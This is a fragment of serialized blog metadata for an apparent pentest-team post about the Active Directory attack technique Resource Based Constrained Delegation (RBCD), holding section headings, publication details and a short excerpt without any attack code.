Conclusion#",{"depth":123,"slug":401,"text":402},"52-how-to-prevent-it","5.2 How to Prevent It:#",[],[],{"title":325,"published":406,"description":327,"image":328,"tags":407,"category":330,"draft":39,"minutes":408,"words":409,"excerpt":410},["Date","2025-07-25T00:00:00.000Z"],[330,331,43],5,969,"In many different environments, our Pentest team finds the same common active directory related vulnerabilities over and over again. Those can often be exploited for privilege escalation and or lateral movement. This blog post presents one of these well-known publicly documented attack techniques – namely Resource Based Constrained Delegation (RBCD).",[],"rbcd.md"]